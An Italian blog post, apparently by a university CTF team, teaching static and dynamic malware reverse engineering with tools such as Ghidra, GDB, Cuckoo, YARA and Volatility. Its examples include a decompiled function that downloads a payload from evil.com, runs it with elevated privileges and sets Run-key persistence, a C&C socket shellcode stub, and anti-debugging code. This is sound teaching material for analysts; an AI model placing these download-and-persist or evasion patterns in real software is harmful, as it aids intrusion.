---
layout: ../../layouts/BlogLayout.astro
title: "Reverse Engineering di Malware: Analisi Statica e Dinamica"
date: 2024-01-10
author: "the pirate"
tags: ["reverse", "misc"]
image: "https://images.pexels.com/photos/1181244/pexels-photo-1181244.jpeg?auto=compress&cs=tinysrgb&w=600&h=400&fit=crop"
---

Il reverse engineering di malware è una disciplina fondamentale nella cybersecurity. Questo articolo esplora le tecniche di analisi statica e dinamica utilizzate per comprendere il comportamento di software malevolo.

## Introduzione al Reverse Engineering

Il reverse engineering di malware consiste nell'analisi approfondita di software malevolo per comprenderne:
- **Funzionalità**: Cosa fa il malware
- **Meccanismi**: Come opera
- **Indicatori**: Come identificarlo
- **Contromisure**: Come difendersi

## Preparazione dell'Ambiente

### Ambiente Isolato

```bash
# Configurazione VM con REMnux
wget https://remnux.org/remnux-cli
sudo ./remnux-cli install --mode=dedicated

# Strumenti essenziali
sudo apt-get install -y \
    hexdump \
    strings \
    file \
    binwalk \
    volatility \
    wireshark
```

### Strumenti di Analisi

```bash
# Disassembler
sudo apt-get install ghidra radare2

# Debugger
sudo apt-get install gdb
pip install pwndbg

# Analisi comportamentale
pip install cuckoo
```

## Analisi Statica

### 1. Analisi Superficiale

```bash
# Informazioni basic del file
file malware.exe
strings malware.exe | head -20
hexdump -C malware.exe | head -10

# Hash e metadata
md5sum malware.exe
sha256sum malware.exe
exiftool malware.exe
```

### 2. Analisi con Ghidra

```c
// Esempio di funzione decompilata
void malicious_function(void) {
    char *url = "http://evil.com/payload";
    char *filename = "C:\\temp\\backdoor.exe";
    
    // Download del payload
    download_file(url, filename);
    
    // Esecuzione con privilegi elevati
    execute_with_privileges(filename);
    
    // Persistenza nel registro
    add_registry_key("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                    "SystemUpdate", filename);
}
```

### 3. Analisi Assembly

```assembly
; Esempio di shellcode
section .text
global _start

_start:
    ; Syscall per socket
    mov eax, 0x66        ; sys_socketcall
    mov ebx, 0x01        ; SYS_SOCKET
    xor ecx, ecx
    push ecx
    push 0x01            ; SOCK_STREAM
    push 0x02            ; AF_INET
    mov ecx, esp
    int 0x80             ; chiamata di sistema
    
    ; Connessione al C&C
    mov edi, eax         ; salva socket descriptor
    mov eax, 0x66
    mov ebx, 0x03        ; SYS_CONNECT
    ; ... resto del codice
```

## Analisi Dinamica

### 1. Monitoring del Sistema

```python
# Script Python per monitoring
import os
import psutil
import time

def monitor_processes():
    baseline = set(p.pid for p in psutil.process_iter())
    
    print("Esegui il malware ora...")
    time.sleep(5)
    
    current = set(p.pid for p in psutil.process_iter())
    new_processes = current - baseline
    
    for pid in new_processes:
        try:
            p = psutil.Process(pid)
            print(f"Nuovo processo: {p.name()} (PID: {pid})")
            print(f"Command line: {p.cmdline()}")
        except:
            pass

monitor_processes()
```

### 2. Analisi del Traffico di Rete

```bash
# Cattura traffico con tcpdump
sudo tcpdump -i eth0 -w malware_traffic.pcap

# Analisi con Wireshark
wireshark malware_traffic.pcap

# Estrazione di URL e domini
strings malware_traffic.pcap | grep -E "(http|https|ftp)"
```

### 3. Analisi con Debugger

```gdb
# GDB con pwndbg
gdb ./malware

# Breakpoint su funzioni interessanti
b main
b CreateProcess
b RegSetValueEx

# Analisi step-by-step
run
ni    # next instruction
si    # step into
x/20x $esp  # examina stack
```

## Tecniche Anti-Reverse Engineering

### 1. Rilevamento di Debugger

```c
// Esempio di anti-debugging
BOOL is_debugger_present() {
    // Metodo 1: PEB check
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) {
        return TRUE;
    }
    
    // Metodo 2: Timing check
    DWORD start = GetTickCount();
    Sleep(100);
    DWORD end = GetTickCount();
    
    if (end - start > 150) {
        return TRUE;  // Possibile debugger
    }
    
    return FALSE;
}
```

### 2. Bypass delle Protezioni

```python
# Script per patch anti-debug
import struct

def patch_anti_debug(binary_path):
    with open(binary_path, 'rb') as f:
        data = f.read()
    
    # Cerca pattern di IsDebuggerPresent
    pattern = b'\x64\x8b\x05\x30\x00\x00\x00'  # mov eax, fs:[30h]
    
    if pattern in data:
        # Sostituisci con NOP
        data = data.replace(pattern, b'\x90' * len(pattern))
        
        with open(binary_path + '_patched', 'wb') as f:
            f.write(data)
        
        print("Anti-debug patch applicato")

patch_anti_debug("malware.exe")
```

## Analisi Avanzata

### 1. Unpacking

```python
# Unpacker generico
def generic_unpacker(packed_file):
    import pefile
    
    pe = pefile.PE(packed_file)
    
    # Cerca sezioni con alta entropia (potenzialmente packed)
    for section in pe.sections:
        entropy = calculate_entropy(section.get_data())
        if entropy > 7.0:
            print(f"Sezione {section.Name} potenzialmente packed (entropia: {entropy})")
    
    # Cerca OEP (Original Entry Point)
    entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    print(f"Entry Point: 0x{entry_point:08x}")

def calculate_entropy(data):
    import math
    if not data:
        return 0
    
    entropy = 0
    for x in range(256):
        p_x = float(data.count(x)) / len(data)
        if p_x > 0:
            entropy += - p_x * math.log(p_x, 2)
    
    return entropy
```

### 2. Analisi Comportamentale

```bash
# Setup Cuckoo Sandbox
cuckoo init
cuckoo community

# Analisi automatizzata
cuckoo submit malware.exe
cuckoo web runserver

# Report in formato JSON
cuckoo report 1 --format json
```

## Strumenti Specializzati

### 1. YARA Rules

```yara
rule Malware_Family_X {
    meta:
        author = "CTF Team UniGe"
        description = "Identifica la famiglia di malware X"
        date = "2024-01-10"
    
    strings:
        $string1 = "evil.com" ascii
        $string2 = "backdoor.exe" ascii
        $hex1 = { 90 90 90 90 C3 }  // NOP NOP NOP NOP RET
    
    condition:
        2 of them and filesize < 1MB
}
```

### 2. Volatility per Memory Analysis

```bash
# Analisi memoria con Volatility
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 malfind
volatility -f memory.dmp --profile=Win7SP1x64 netscan
```

## Conclusioni

Il reverse engineering di malware richiede:

1. **Metodologia sistematica**: Analisi statica → Analisi dinamica → Correlazione
2. **Ambiente sicuro**: Isolamento completo per evitare infezioni
3. **Strumenti specializzati**: Disassembler, debugger, sandbox
4. **Pazienza e persistenza**: I malware moderni usano molte tecniche di evasione

La combinazione di analisi statica e dinamica fornisce una comprensione completa del comportamento del malware, essenziale per sviluppare contromisure efficaci.

> **Attenzione**: Maneggiare malware reale richiede estrema cautela e competenze avanzate. Utilizzare sempre ambienti isolati e seguire le best practice di sicurezza.